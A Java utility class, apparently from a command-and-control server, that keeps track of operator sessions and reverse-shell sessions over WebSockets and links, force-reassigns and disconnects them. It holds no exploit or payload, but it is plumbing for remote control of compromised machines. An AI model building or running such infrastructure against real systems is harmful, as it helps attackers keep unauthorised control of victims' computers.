package com.mtattab.c2cServer.util;

import com.mtattab.c2cServer.model.json.shell.ManagerCommunicationModel;
import com.mtattab.c2cServer.model.json.SocketCommunicationDTOModel;
import lombok.Getter;
import lombok.experimental.UtilityClass;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Set;


@UtilityClass
@Slf4j
@Getter
public class ConnectionManager {



    public static Set<SocketCommunicationDTOModel> activeReverseShellSessionsDTO = new HashSet<>();

    public static Set<WebSocketSession> activeReverseShellSessions = new HashSet<>();

    public static Set<WebSocketSession> activeMangerSessions = new HashSet<>();


    public static HashMap<WebSocketSession, WebSocketSession > connectedManagerToReverseSessions= new HashMap<>();

    public static HashMap<WebSocketSession, WebSocketSession > connectedReverseToManagerSessions= new HashMap<>();

// The key is message uuid and the value is the manager session
    public static HashMap<String, WebSocketSession > rerouteAllCommandToMangerSession = new HashMap<>();


    public static void disconnectConnection(WebSocketSession session){
        log.info("[+] Disconnecting session {} if it has any active connections to other sockets ",session);
        DataManipulationUtil.removeByValue(connectedReverseToManagerSessions, session);
        DataManipulationUtil.removeByValue(connectedManagerToReverseSessions, session);
        DataManipulationUtil.removeByValue(rerouteAllCommandToMangerSession, session);

    }

    public static WebSocketSession getBySessionId(String sessionId, HashMap<WebSocketSession, WebSocketSession > sessions){
        Set<WebSocketSession> sessionSet=  sessions.keySet();
        for (WebSocketSession webSocketSession : sessionSet) {
            if (sessionId.equalsIgnoreCase(webSocketSession.getId())){
                return webSocketSession;
            }
        }
        return null;
    }





    public static boolean connectTwoSockets(WebSocketSession managerSocket, WebSocketSession socketToConnectTo, boolean forceConnect){
//        if manger socket is already connected to something ask user to disconnect first
        if (connectedManagerToReverseSessions.get(managerSocket) != null ){

            SocketUtil.sendMessage(managerSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("current socket '%s' is already connected to: '%s' please disconnect first then try again",managerSocket.getId(), connectedManagerToReverseSessions.get(managerSocket)))
                    .success(false)
                    .build()
            )));
            return false;
        }

//        if target socket is already connected then deny user access to the socket
        if (connectedReverseToManagerSessions.get(socketToConnectTo) != null && !forceConnect){
            SocketUtil.sendMessage(managerSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("target socket '%s' is already connected to: '%s' you can force the connection with the use '-f' flag",socketToConnectTo,
                            connectedReverseToManagerSessions.get(socketToConnectTo)))
                    .success(false)

                    .build()
            )));
            return false;
//            if the user want to force connect then disconnect already connected reverse shell and create new connection
        } else if (connectedReverseToManagerSessions.get(socketToConnectTo) != null && forceConnect) {
//            inform the manager how is already connected of his removal
            SocketUtil.sendMessage(connectedReverseToManagerSessions.get(socketToConnectTo),
                    new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("you are being disconnected by manager '%s'",managerSocket))
                    .build()
                    )));
            disconnectConnection(socketToConnectTo);
            connect(managerSocket,socketToConnectTo);
            SocketUtil.sendMessage(managerSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                    .msg(String.format("forcing connection to target socket '%s'",socketToConnectTo))
                    .success(true)

                    .build()
            )));

            return true;
        }

        SocketUtil.sendMessage(managerSocket, new TextMessage(DataManipulationUtil.convertObjectToJson(ManagerCommunicationModel.builder()
                .msg(String.format("Connected successfully to socket: '%s'. You can use /?? for agent help and use /? for server help menu",socketToConnectTo.getId()))
                .success(true)
                .build()
        )));

//        establish connection
        connect(managerSocket,socketToConnectTo);


        return true;
    }

    private static void connect(WebSocketSession mangerSocket, WebSocketSession socketToConnectTo){
        connectedManagerToReverseSessions.put(mangerSocket,socketToConnectTo);
        connectedReverseToManagerSessions.put(socketToConnectTo, mangerSocket);
    }

}
